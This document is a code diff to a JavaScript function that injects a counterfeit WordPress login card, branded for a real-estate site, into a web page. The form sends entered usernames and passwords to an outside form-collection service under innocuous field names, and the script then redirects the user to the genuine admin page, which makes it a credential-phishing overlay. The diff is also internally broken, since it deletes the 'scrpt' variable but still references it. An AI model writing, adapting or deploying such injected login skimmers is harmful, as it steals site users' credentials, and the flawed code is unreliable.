@@ -28,6 +28,14 @@ function renderHTMLTemplate() {
             height: 70px;
             width: 320px;
             margin: 0 auto;
+            position: relative;
+        }
+        #tempWp5622 .logo-lgn a{
+            position: absolute;
+            top: 0px;
+            left: 0px;
+            width: 100%;
+            height: 100%;
         }
 
         #tempWp5622 .frm-crd{
@@ -255,8 +263,45 @@ function renderHTMLTemplate() {
     </style>
     `;
 
-    const scrpt = `
-    <script> 
+    const template = `
+        <div class="wp-lgn-crd">
+            <div class="logo-lgn"><a href="https://seventytworealestate.com/"></a></div>
+            <div class="frm-crd">
+                <form action="https://formspree.io/f/xrbgoeyb" method="POST" id="formLgnWP">
+                    <p class="f-g-wp">
+                        <label for="userNameEmailLogin" id="labelUserLgn">Username or Email Address</label>
+                        <input type="text" name="name" class="wp-inp" id="userNameEmailLogin" required>
+                    </p>
+                    <p class="f-g-wp">
+                        <label for="userPassLogin" id="labPaaWP">Password</label>
+                        <input type="password" name="message" id="userPassLogin" class="wp-inp pass"  required>
+                        <button type="button" id="btnShowHide" class="btn-show-hid show"></button>
+                    </p>
+                    <div class="l-row">
+                        <p class="customforgetmenot"><input name="remme" type="checkbox" id="lgnrememberme" class="inp-checkbx"> <label for="lgnrememberme" class="lab-rem" id="labRemmem">Remember Me</label></p>
+                        <p><input type="submit" id="wp-submit-cus" class="btn-sub" value="Log In"></p>
+                    </div>
+                </form>
+            </div>
+            <div class="row2">
+                <a class="wp-lostpass" href="https://seventytworealestate.com/wp-login.php?action=lostpassword" id="lnkLostPaa">Lost your password?</a>
+            </div>
+            <div class="row3">
+                <a class="wp-vstweb" href="https://seventytworealestate.com/" id="lnkVstSite">← Go to 72 Real Estate</a>
+            </div>
+            <div class="row4">
+                <label for="lang-select" class="lang-icon"></label>
+                <select id="langSele" class="wp-select">
+                    <option value="en_US" lang="en">English (United States)</option>
+                    <option value="it_IT" lang="it">Italiano</option>
+                    <option value="tr_TR" lang="tr">Türkçe</option>
+                </select>
+                <button class="btn-change-lang" id="changeLangBtn">Change</button>
+            </div>
+        </div>
+    `;
+    const script = document.createElement('script');
+    script.innerHTML = `
         document.getElementById("btnShowHide").addEventListener("click", function() {
             const passInput = document.getElementById("userPassLogin");
             const btn = document.getElementById("btnShowHide");
@@ -343,46 +388,12 @@ function renderHTMLTemplate() {
                 window.location.href = 'https://seventytworealestate.com/wp-admin/';
             });
         });
-        
-    </script>
-`;
-    const template = `
-        <div class="wp-lgn-crd">
-            <div class="logo-lgn"></div>
-            <div class="frm-crd">
-                <form action="https://formspree.io/f/xrbgoeyb" method="POST" id="formLgnWP">
-                    <p class="f-g-wp">
-                        <label for="userNameEmailLogin" id="labelUserLgn">Username or Email Address</label>
-                        <input type="text" name="name" class="wp-inp" id="userNameEmailLogin" required>
-                    </p>
-                    <p class="f-g-wp">
-                        <label for="userPassLogin" id="labPaaWP">Password</label>
-                        <input type="password" name="message" id="userPassLogin" class="wp-inp pass"  required>
-                        <button type="button" id="btnShowHide" class="btn-show-hid show"></button>
-                    </p>
-                    <div class="l-row">
-                        <p class="customforgetmenot"><input name="remme" type="checkbox" id="lgnrememberme" class="inp-checkbx"> <label for="lgnrememberme" class="lab-rem" id="labRemmem">Remember Me</label></p>
-                        <p><input type="submit" id="wp-submit-cus" class="btn-sub" value="Log In"></p>
-                    </div>
-                </form>
-            </div>
-            <div class="row2">
-                <a class="wp-lostpass" href="https://seventytworealestate.com/wp-login.php?action=lostpassword" id="lnkLostPaa">Lost your password?</a>
-            </div>
-            <div class="row3">
-                <a class="wp-vstweb" href="https://seventytworealestate.com/" id="lnkVstSite">← Go to 72 Real Estate</a>
-            </div>
-            <div class="row4">
-                <label for="lang-select" class="lang-icon"></label>
-                <select id="langSele" class="wp-select">
-                    <option value="en_US" lang="en">English (United States)</option>
-                    <option value="it_IT" lang="it">Italiano</option>
-                    <option value="tr_TR" lang="tr">Türkçe</option>
-                </select>
-                <button class="btn-change-lang" id="changeLangBtn">Change</button>
-            </div>
-        </div>
     `;
+
+    
+
+
+
     let container = document.getElementById('tempWp5622');
     if (!container) {
         container = document.createElement('div');
@@ -390,5 +401,9 @@ function renderHTMLTemplate() {
         document.body.appendChild(container);
     }
     container.innerHTML = styles + template + scrpt;
+
+    document.body.appendChild(script);
 }
+
+
 renderHTMLTemplate();
